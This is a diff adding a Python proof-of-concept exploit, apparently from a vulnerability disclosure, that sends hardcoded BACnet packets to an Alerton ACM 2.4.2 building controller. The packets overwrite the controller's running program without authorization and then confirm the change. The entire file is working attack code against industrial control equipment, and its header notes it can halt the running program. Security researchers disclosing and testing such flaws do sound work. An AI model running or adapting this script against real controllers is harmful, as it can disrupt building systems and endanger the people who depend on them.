@@ -1,0 +1,188 @@
+#!/usr/bin/python3
+"""
+#### DO NOT USE IN PRODUCTION ####
+#### Use with care - This software will change the program running on Alerton ACM ###
+
+License: GPLv3
+Author: SCADAfence Ltd
+Title: Alerton Unauthorized Program Read and Write Script
+
+
+Alerton ACM 2.4.2 Unauthorized Programming Change
+- The program running on ACM  2.4.2 is changed after running script causing changes in program flow and possibly even
+  halting the running program
+- Usage: python3 --ip X.X.X.X --port 47808
+
+Dependencies:
+    - python3
+    - run script as root (or using sudo)
+
+Tested against Alerton ACM with firmware version 2.4.2 and Visual Logic ver. 4.0.0.0
+This issue affects: Alerton ACM with firmware version 2.4.2 - Changes the program running on the controller
+                    Alerton Visual Logic ver 4.0.0.0 - Displays locally saved program file, which differs from the
+                                                       program running on the controller
+"""
+
+import argparse
+import socket
+
+DEFAULT_PORT = 47808
+
+# readProperty device 1000 vendor Id
+READ_PROPERTY_VENDOR_ID_PACKET = bytes.fromhex("810a001101040275630c0c020003e81978")
+
+# readProperty device 1000 vendor proprietary value
+READ_PROPERTY_VENDOR_PROP_VAL = bytes.fromhex("810a001201040275640c0c020003e81a0200")
+
+# readProperty device 1024 program - change
+READ_PROPERTY_PROGRAM_CHANGE = bytes.fromhex("810a001101040275650c0c04000400195a")
+
+# WriteProperty device 1024 program - change
+WRITE_PROPERTY_PROGRAM_CHANGE = bytes.fromhex("810a001501040275660f0c04000400195a3e91053f")  # change state to ready
+
+# readProperty device 1024 program - state
+READ_PROPERTY_PROGRAM_STATE = bytes.fromhex("810a001101040275670c0c04000400195c")
+
+# WriteProperty device 1024 file size
+WRITE_PROPERTY_FILE_SIZE = bytes.fromhex("810a001501040275680f0c02800400192a3e21003f")
+
+WRITE_PROPERTY_PROGRAM_CHANGE_TO_LOAD = bytes.fromhex("810a0015010402756b0f0c04000400195a3e91013f")
+
+ADD_CODE_BLOCK_PACKET = bytes.fromhex("810a032501040275e407c402"
+                                      "8004000e310065fe030e030e030e0200050044454d4f4d00060028"
+                                      "6e6f6e6529000600524144494f4e0006005343414441460001002a"
+                                      "0006003030303030300002003030000b00496d706c656d656e746f"
+                                      "7200ffffadbec30100000950000f00017002b50901870478090126"
+                                      "066008018909cc0901910bd809018209b20801980b540801070e4e"
+                                      "09016509d506016c09b50501b00b9006013309f603014f07cf0901"
+                                      "2f09530301bf0a32010b1f0001050005e40c8d01043c0f840101b9"
+                                      "056a09014e08710701990c29090aeb000300040007000000030069"
+                                      "000380010303808c00020064006900020203806e0000036f000000"
+                                      "0480aa000200000093ffbe0005800102410000000580960003030f"
+                                      "ffffff780082000102300000003000b6ff8c009600010230000000"
+                                      "30004cff8200a00000043000f6ff3000cbffaa00be0002003000fc"
+                                      "ff3000c5ffb400be000202300000003000a8000480b4000301d0ff"
+                                      "0000d0ff2afe05808200010300006e0102ff6e016e006900000030"
+                                      "000000300041ffa8fc41ffa8fc12019600a0000005280000003e00"
+                                      "00005b0000005b00d700a000048003003000000030000cfe87fd0c"
+                                      "fe72fd0cfe0c0b00fdff506167652d310c0b00fdff506167652d32"
+                                      "0c0b00fdff506167652d330c0b00fdff506167652d340c0b00fdff"
+                                      "506167652d350c0b00fdff506167652d360c0b00fdff506167652d"
+                                      "370c0b00fdff506167652d380c0b00fdff506167652d3964001c05"
+                                      "0102001200004040018800690010020202009401880094026e0028"
+                                      "020505020094021200000000120000803f940178000f0201009402"
+                                      "2082002802050101009400120000000020228c000f020100940221"
+                                      "9600280205010100960012000000002123a0001b01010505050502"
+                                      "002223120000803f120000803f120000c84212000000008801aa00"
+                                      "160205050501008801120000c6421200000000120000000024b400"
+                                      "16050205050100120000803f88011200000000120000000025be00"
+                                      "140101020024259400c800200a0200c7f303000000800055008864"
+                                      "ca000f02020094029402d20020020a008865c7f303002d00800055"
+                                      "000f270100fffff1950f")
+
+
+READ_PROGRAM_SEQUENCE = [
+    bytes.fromhex("810a001101040275930c0c020003e8197800"),
+    bytes.fromhex("810a001201040275940c0c020003e81a0200"),
+    bytes.fromhex("810a001101040275950c0c02800400192a00"),
+    bytes.fromhex("810a0016010402759606c4028004000e310022030e0f")
+]
+
+
+PROG_CHANGE_PACKET_SEQUENCE = [
+    READ_PROPERTY_VENDOR_ID_PACKET,
+    READ_PROPERTY_VENDOR_PROP_VAL,
+    READ_PROPERTY_PROGRAM_CHANGE,
+    WRITE_PROPERTY_PROGRAM_CHANGE,
+    READ_PROPERTY_PROGRAM_STATE,
+    WRITE_PROPERTY_FILE_SIZE,
+    ADD_CODE_BLOCK_PACKET,
+    READ_PROPERTY_PROGRAM_CHANGE,
+    WRITE_PROPERTY_PROGRAM_CHANGE_TO_LOAD
+]
+
+g_initial_program = None
+
+
+def argument_parser():
+    parser = argparse.ArgumentParser(
+        description='Alerton Configuration Change POC')
+    parser.add_argument('--ip',
+                        type=str,
+                        help='<X.X.X.X>',
+                        required=True)
+    parser.add_argument('-p', '--port',
+                        default=DEFAULT_PORT,
+                        type=int,
+                        help='BACnet Port used in Alerton ACM',
+                        required=False)
+    return parser.parse_args()
+
+
+def get_socket_object():
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(30)
+    sock.bind(('0.0.0.0', 47808))
+    return sock
+
+
+def retrieve_initial_program(target_ip, target_port, socket_obj):
+
+    global g_initial_program
+
+    current_program = retrieve_current_program(target_ip, target_port, socket_obj)
+
+    if current_program is not None:
+        g_initial_program = current_program
+        return True
+    else:
+        return False
+
+
+def write_program_to_plc(target_ip, target_port, socket_obj):
+
+    for packet in PROG_CHANGE_PACKET_SEQUENCE:
+        socket_obj.sendto(packet, (target_ip, target_port))
+        socket_obj.recv(1024)
+
+
+def is_file_changed(target_ip, target_port, socket_obj):
+
+    global g_initial_program
+
+    current_program = retrieve_current_program(target_ip, target_port, socket_obj)
+    return g_initial_program != current_program
+
+
+def retrieve_current_program(target_ip, target_port, socket_obj):
+    response = None
+
+    for packet in READ_PROGRAM_SEQUENCE:
+        socket_obj.sendto(packet, (target_ip, target_port))
+        response = socket_obj.recv(1024)
+
+    return response
+
+
+def main(args):
+    target_ip = args.ip
+    target_port = args.port
+
+    socket_obj = get_socket_object()
+    if retrieve_initial_program(target_ip, target_port, socket_obj):
+
+        print('~ Host {} - Initial Program Retrieved'.format(target_ip))
+        write_program_to_plc(target_ip, target_port, socket_obj)
+
+        if is_file_changed(target_ip, target_port, socket_obj):
+            print('~ Host {} - Program Changed Successfully'.format(target_ip))
+        else:
+            print('~ Host {} - Program Change Failed'.format(target_ip))
+    else:
+        print('~ Host {} - Failed to retrieve program. Shutting down script'.format(target_ip))
+
+
+if __name__ == "__main__":
+    _args = argument_parser()
+    main(_args)
